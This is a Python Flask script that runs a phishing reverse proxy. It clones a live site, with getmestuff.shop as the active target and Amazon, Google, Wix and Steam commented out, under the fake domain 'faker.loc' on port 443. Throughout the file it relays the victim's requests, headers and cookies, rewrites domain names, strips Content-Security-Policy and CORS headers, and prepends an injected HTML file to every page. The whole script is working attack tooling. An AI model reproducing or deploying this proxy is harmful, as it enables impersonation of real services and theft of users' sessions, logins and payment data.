from flask import Flask,request,make_response
import requests
import base64
import re
import urllib.parse
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

app = Flask(__name__)

def make_request(method, url, headers, post_data = None, retries = 3, use_proxy = True):
	proxies = {'http': 'http://192.168.1.49:9000','https': 'http://192.168.1.49:9000'} if use_proxy else {}
	counter = 0
	while counter < retries:
		try:
			if method == 'GET':
				return requests.get(url, headers=headers, allow_redirects=False, verify=False, timeout=5, proxies=proxies)
			elif method == "POST":
				return requests.post(url, headers=headers, data=post_data, allow_redirects=False, verify=False, timeout=5, proxies=proxies)
			elif method == "OPTIONS":
				return requests.options(url, headers=headers, allow_redirects=False, verify=False, timeout=5, proxies=proxies)
			elif method == "HEAD":
				return requests.head(url, headers=headers, allow_redirects=False, verify=False, timeout=5, proxies=proxies)
			else:
				counter = retries
				raise Exception("unsupported method = " + method)
		except Exception as e:
			print(">>>>>>>>>>>>>>> ERROR, repeating.... ERRURL = " + url + " | " + str(e), flush=True)
			counter += 1
			
# TODO: sustritution must be more wise than this basic version
def substitute_domain(data, domainOrig, domainSubst):
	beforeSym = "([^.-])"
	if 'www.' in domainOrig:
		data = re.sub(beforeSym+domainOrig.replace('www.', ''), "\g<1>"+domainSubst, data)
	else:
		data = re.sub(beforeSym+"www."+domainOrig, "\g<1>"+domainSubst, data)
	data = re.sub(beforeSym+domainOrig, "\g<1>"+domainSubst, data)
	return data

@app.before_request
#def main(domain = "www.amazon.com", path = ""):
def main(domain = "getmestuff.shop", path = ""):
#def main(domain = "www.google.com", path = ""):
#def main(domain = "www.wix.com", path = "demone2/phone-and-tablet"):
#def main(domain = "www.wix.com", path = "demone2/barbershop"):
#def main(domain = "store.steampowered.com", path = ""):

	fakeDomain = "faker.loc"
	baseUrl = "https://"+domain

	# url
	url = request.args.get("_URL_")
	if url:
		#url = url.replace(fakeDomain, domain)
		if domain not in url and 'https://' not in url and 'http://' not in url:
			url = f"{baseUrl}{url}"
	else:	
		url = baseUrl + (request.path if request.path else path)
		query = request.query_string.decode("utf8")
		if query:
			url += "?" + query
	# more relient to replace every time - just in case fake domain in url somehow
	url = substitute_domain(url, fakeDomain, domain)

	# static content (images, css)
	accept = request.headers['accept'].lower()
	if accept and ('image' in accept or 'css' in accept) and 'text/html' not in accept:
		responseFake = make_response()
		responseFake.headers['Location'] = url
		return responseFake, 302

	# headers from client
	headers = {}
	for header in request.headers:
		k, v = header
		if k.lower() not in ['connection', 'host', 'origin', 'referer']:
			headers[k] = v

	# redirect
	response = make_request(request.method, url, headers, request.get_data())
	if int(response.status_code) in [301, 302]:
		responseFake = make_response(response.content)
		for cookie in response.cookies:
			responseFake.set_cookie(cookie.name, cookie.value)
		location = response.headers['Location']
		replaced = substitute_domain(location, domain, fakeDomain)
		if replaced != location:
			# if redirect within same domain, better use original path in URL instead of query appendix
			responseFake.headers['Location'] = replaced
		else:
			responseFake.headers['Location'] = f"https://{fakeDomain}?_URL_={urllib.parse.quote_plus(location)}"
		return responseFake, response.status_code

	# data
	data = response.content
	rtype = response.headers['content-type'] if 'content-type' in response.headers else ""
	if 'text' in rtype or 'application/javascript' in rtype:
		data = data.decode("utf8")
		# TODO: think about links substitution
		#data = re.sub(r'''(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’]))''', "https://" + fakeDomain + "?_URL_=\g<1>", data)
		data = substitute_domain(data, domain, fakeDomain)
		data = data.encode("utf8")
	if 'text/html' in rtype and not ".js" in url:
		wrapper = open("/root/Desktop/copier/inject.html").read() \
			.replace('{DOMAIN_ORIG}', domain) \
			.replace('{DOMAIN_FAKE}', fakeDomain)
		# first - wrapper, after - original content
		data = wrapper + data.decode("utf8")

	# headers to client
	responseFake = make_response(data)
	for header in response.headers:
		if header.lower() not in ['content-length', 'content-encoding', 'content-security-policy', 'cross-origin-opener-policy', 'set-cookie', 'access-control-allow-origin']:
			responseFake.headers[header] = response.headers[header]

	# cookies
	for cookie in response.cookies:
		responseFake.set_cookie(cookie.name, cookie.value)

	return responseFake, response.status_code

app.run(host='0.0.0.0', port=443, debug=False, ssl_context=('/root/Desktop/copier/cert.pem', '/root/Desktop/copier/key.pem'))

# substitution experiments
#text = '"https://ree.com" ; http://reeee.com ; https://yandex.ru ; "https%3A//yandex.ru"'
#print(re.sub(r'''(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’]))''', "L=\g<1>", text))